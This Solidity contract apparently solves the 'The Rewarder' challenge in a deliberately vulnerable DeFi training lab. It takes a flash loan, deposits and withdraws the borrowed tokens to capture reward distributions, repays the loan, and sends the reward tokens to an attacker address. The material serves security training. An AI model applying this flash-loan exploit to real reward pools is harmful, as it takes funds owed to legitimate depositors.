// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    // using Address for address payable;

    // receive() external payable {};

    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanerPool;
    DamnValuableToken damnValuableToken;
    RewardToken rewardToken;
    address attacker;
    address rewarderPoolAddress;
    address flashPoolAddress;

    constructor(
        address _rewarderPoolAddress,
        address _flashPoolAddress,
        address liquidityToken,
        address rewardTokenAddress,
        address _attacker
    ) {
        rewarderPool = TheRewarderPool(_rewarderPoolAddress);
        flashLoanerPool = FlashLoanerPool(_flashPoolAddress);
        damnValuableToken = DamnValuableToken(liquidityToken);
        rewardToken = rewarderPool.rewardToken();
        attacker = _attacker;
        rewarderPoolAddress = _rewarderPoolAddress;
        flashPoolAddress = _flashPoolAddress;
    }

    function receiveFlashLoan(uint256 amount) public {
        damnValuableToken.approve(rewarderPoolAddress, amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        damnValuableToken.transfer(flashPoolAddress, amount);
    }

    function takeRewards() public {
        flashLoanerPool.flashLoan(
            damnValuableToken.balanceOf(address(flashLoanerPool))
        );
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
